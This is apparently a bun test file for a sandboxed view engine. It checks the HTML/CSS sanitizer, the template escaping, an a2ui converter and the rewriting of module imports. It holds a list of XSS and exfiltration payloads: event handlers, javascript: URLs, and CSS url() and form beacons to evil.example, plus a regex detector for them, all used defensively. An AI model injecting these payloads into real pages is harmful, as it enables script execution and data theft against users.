// @ts-nocheck — plain JS
// The view engine's parts outside a frame (linkedom stands in for the frame's DOM): hostile markup comes out of the
// sanitizer with only our tags and attributes and no address that leads anywhere; templates put every value in as
// text; the a2ui lens reads the dome planner as the one kind of view; a module script's imports become lookups.
// Run: bun test src/lib/sandbox/view/view.test.js
import { describe, expect, test } from 'bun:test';
import { DOMParser, parseHTML } from 'linkedom';
import { cleanCss, sanitize } from './sanitize.js';
import { eventOf, render } from './template.js';
import { fromA2ui } from './a2ui.js';
import { classic } from './imports.js';
import { EXAMPLES } from '../../../../game/genui/examples.js';

const clean = (html) => {
	const doc = new DOMParser().parseFromString(`<!doctype html><html><head></head><body>${html}</body></html>`, 'text/html');
	for (const s of doc.querySelectorAll('script')) s.remove();
	sanitize(doc.body);
	return doc.body.innerHTML;
};

const HOSTILE = [
	'<img src=x onerror=alert(1)>',
	'<img src="https://evil.example/p.png">',
	'<img src="javascript:alert(1)">',
	'<svg onload=alert(1)><rect/></svg>',
	'<svg><a href="javascript:alert(1)"><text>x</text></a></svg>',
	'<svg><use href="https://evil.example/s.svg#x"/></svg>',
	'<svg><image href="https://evil.example/p.png"/></svg>',
	'<svg><animate attributeName="href" to="javascript:alert(1)"/></svg>',
	'<svg><foreignObject><iframe src="https://evil.example"></iframe></foreignObject></svg>',
	'<svg><rect fill="url(https://evil.example/x)"/></svg>',
	'<iframe src="https://evil.example"></iframe>',
	'<iframe srcdoc="<script>parent.x=1</script>"></iframe>',
	'<object data="x.swf"></object><embed src="x">',
	'<meta http-equiv="refresh" content="0;url=https://evil.example">',
	'<link rel="stylesheet" href="https://evil.example/x.css">',
	'<base href="https://evil.example/">',
	'<form action="https://evil.example"><input name="a"><button type="submit">go</button></form>',
	'<a href="https://evil.example/?leak=1">leave</a>',
	'<a href="javascript:alert(1)">x</a>',
	'<div style="background:url(https://evil.example/x)">x</div>',
	'<div style="background:u\\72l(https://evil.example/x)">x</div>',
	'<style>@import url(https://evil.example/x.css); body{background:url("https://evil.example/y")}</style>',
	'<style>@font-face{font-family:x;src:url(https://evil.example/f.woff2)}</style>',
	'<div onclick="alert(1)" onmouseover="x()">x</div>',
	'<input type="image" src="https://evil.example/x">',
	'<input type="file"><input type="password"><input type="hidden" value="x">',
	'<button formaction="https://evil.example">x</button>',
	'<img name="createElement" src="data:image/png;base64,AA=="><input name="body">',
	'<template><img src=x onerror=alert(1)><iframe></iframe></template>',
	'<details open ontoggle=alert(1)>x</details>',
	'<video src="https://evil.example/v.mp4"></video><audio src="x"></audio><source src="x">',
	'<math><mtext><script>alert(1)</script></mtext></math>',
	'<noscript><img src=x onerror=alert(1)></noscript>',
	'<x-custom onclick="alert(1)">x</x-custom>',
	'<maia-chart onclick="alert(1)" items="[]"></maia-chart>',
	'<div style="behavior:url(x.htc);-moz-binding:url(x)">x</div>',
	'<p title="&#106;avascript:alert(1)">x</p>',
	'<svg><style>rect{fill:url(https://evil.example/x)}</style></svg>'
];

/** everything a view's DOM may hold after the sanitizer, checked again from scratch */
function problems(html) {
	const out = [];
	if (/<\s*(script|iframe|object|embed|meta|link|base|form|video|audio|source|math|noscript|foreignobject|animate|set)\b/i.test(html)) out.push('tag');
	if (/\son\w+\s*=/i.test(html)) out.push('handler');
	if (/https?:\/\/|javascript:|evil\.example/i.test(html)) out.push('address');
	if (/\shref="(?!#)/i.test(html)) out.push('href');
	if (/@import/i.test(html)) out.push('import');
	if (/name="(createElement|body)"/.test(html.replace(/<input[^>]*>/g, ''))) out.push('clobber');
	return out;
}

describe('hostile markup', () => {
	for (const h of HOSTILE)
		test(h.slice(0, 70), () => {
			const out = clean(h);
			expect(problems(out)).toEqual([]);
		});
	test('what stays: our tags, safe attributes, inline pictures, this page\'s references', () => {
		const out = clean('<div class="a" style="color:red" data-x="1" aria-label="b"><svg viewBox="0 0 1 1"><defs><linearGradient id="g"></linearGradient></defs><rect fill="url(#g)" x="1"></rect><use href="#g"></use></svg><img src="data:image/png;base64,AA==" alt="p"><maia-metric label="Domes" value="5"></maia-metric><input type="range" min="0" max="9" value="3"><button>b</button></div>');
		for (const s of ['class="a"', 'style="color:red"', 'data-x="1"', 'aria-label="b"', 'url(#g)', 'href="#g"', 'src="data:image/png', 'label="Domes"', 'type="range"', 'type="button"']) expect(out).toContain(s);
	});
	test('CSS: imports and addresses go, inline fonts and pictures stay', () => {
		expect(cleanCss('@import "x"; a{b:url(https://e.example/x)} c{src:url(data:font/woff2;base64,AA)}')).toBe(' a{b:none} c{src:url(data:font/woff2;base64,AA)}');
	});
});

describe('templates put values in as text', () => {
	const { document } = parseHTML('<!doctype html><html><body></body></html>');
	const tpl = (html) => new DOMParser().parseFromString(`<!doctype html><html><body>${html}</body></html>`, 'text/html').body;
	test('marks, loops, conditions, components', () => {
		const out = render(document, tpl('<p>{{a}} and {{b.c}}</p><template each="list" as="x"><i>{{x.n}}·{{index}}</i></template><template if="!gone"><b>here</b></template><maia-chart items="{{list}}"></maia-chart><input value="{{num}}">'), { a: '<script>x</script>', b: { c: 1234.567 }, list: [{ n: 'u' }, { n: 'v' }], num: 1500 });
		const div = document.createElement('div');
		div.append(out);
		expect(div.innerHTML).toBe('<p>&lt;script&gt;x&lt;/script&gt; and 1,234.57</p><i>u·0</i><i>v·1</i><b>here</b><maia-chart items="[{&quot;n&quot;:&quot;u&quot;},{&quot;n&quot;:&quot;v&quot;}]"></maia-chart><input value="1500">');
	});
	test('an event: a button names it, a range hands its number', () => {
		const body = tpl('<button data-event="dome" data-value="&quot;Small&quot;"><span>Small</span></button><input type="range" data-event="people" value="24">');
		expect(eventOf(body.querySelector('span'), 'click')).toEqual({ name: 'dome', value: 'Small' });
		expect(eventOf(body.querySelector('input'), 'input')).toEqual({ name: 'people', value: 24 });
		expect(eventOf(body.querySelector('input'), 'click')).toBe(null);
	});
});

describe('the a2ui lens', () => {
	const planner = EXAMPLES.find((v) => v.id === 'dome-planner').spec;
	test('the dome planner as HTML with our components and marks, its logic and data kept', () => {
		const v = fromA2ui(planner);
		expect(v.logic).toBe(planner.logic);
		expect(v.data).toEqual(planner.data);
		for (const s of ['<maia-card title="Dome planner"', '<maia-metric label="Domes" value="{{domes}}" unit="{{dome}}" tone="accent">', 'data-event="dome" data-value="&quot;Large&quot;" data-on="*"', 'type="range" data-event="people" min="12" max="1500" step="12" value="{{people}}"', '<maia-chart kind="bars" label="Domes needed by size" items="{{beds}}">']) expect(v.html).toContain(s);
		expect(problems(clean(v.html))).toEqual([]);
	});
	test('an agent\'s text stays text, braces too', () => {
		const v = fromA2ui({ root: 't', components: [{ id: 't', type: 'Text', text: '<img src=x onerror=1> {{secret}}' }] });
		expect(v.html).toBe('<p>&lt;img src=x onerror=1&gt; {&#8203;{secret}}</p>');
	});
});

describe('module scripts as classic ones', () => {
	test('imports become lookups, exports go, top-level await waits', () => {
		const out = classic("import * as THREE from 'three';\nimport { OrbitControls as OC } from 'three/addons/controls/OrbitControls.js';\nimport App, { x } from 'y';\nexport const a = 1;\nconst m = await import('d3');\nconsole.log(import.meta.url);");
		expect(out).toContain('const THREE = __maiaImport("three");');
		expect(out).toContain('const { OrbitControls: OC } = __maiaImport("three/addons/controls/OrbitControls.js");');
		expect(out).toContain("const App = ((m) => (m && 'default' in m ? m.default : m))(__maiaImport(\"y\"));");
		expect(out).toContain('const a = 1;');
		expect(out).toContain("await __maiaDynamic('d3')");
		expect(out).toContain('({ url: "" }).url');
		expect(out.startsWith('(async () => {')).toBe(true);
	});
});
